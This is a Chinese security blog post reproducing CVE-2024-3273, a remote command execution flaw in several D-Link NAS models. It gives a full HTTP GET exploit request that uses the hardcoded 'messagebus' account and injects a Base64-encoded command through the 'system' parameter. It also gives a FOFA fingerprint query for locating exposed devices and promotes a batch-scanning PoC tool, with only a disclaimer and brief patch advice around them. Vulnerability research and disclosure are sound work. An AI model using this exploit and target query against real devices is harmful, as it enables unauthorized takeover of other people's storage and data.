#  【漏洞复现】D-Link NAS 远程命令执行漏洞(CVE-2024-3273)   
原创 清风  白帽攻防   2024-11-19 09:52  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
D-Link NAS（网络附加存储）是通过网络连接的存储设备，允许多个设备共享和存储数据。作为一家知名的网络设备品牌，D-Link 提供多种 NAS 解决方案，广泛应用于家庭和企业环境中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dakQkvYTcT4pr9bd9LAZXfXfds3MLKp08Xnf2cpkQ3icXT4wlXTbNZAr9AiaftKI5f2pZshDcPUMAw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
漏洞描述  
  
通过硬编码帐户（用户名：“messagebus”和空密码）造成的后门以及“system”参数的命令注入问题，攻击者可在设备上远程执行命令。命令注入漏洞通过 HTTP GET 请求将 Base64 编码的命令添加到“system”参数中从而被执行。  
影响版本```
DNS-320L
DNS-325
DNS-327L 
DNS-340L
```  
fofa语法```
fid="hWN+yVVhLzKJaLkd/ITHpA=="
```  
漏洞复现```
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=cHdk HTTP/1.1Host: IPUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dsnxBzMsDoZLEIJ5Ricybib7SFknZCecWDuRrGSibbN3jTJCQ4oN3ib3InyYksm6wpty7eibvbdwziaiaibg/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0dsnxBzMsDoZLEIJ5Ricybib762CzKibvlGhDf9uMNv7NxyZpPPbIZtOyR06sfxwBBt5JtJVhWbL7dUQ/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
  
1、关闭互联网暴露面或接口  
  
2、及时更新补丁或升级至安全版本  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
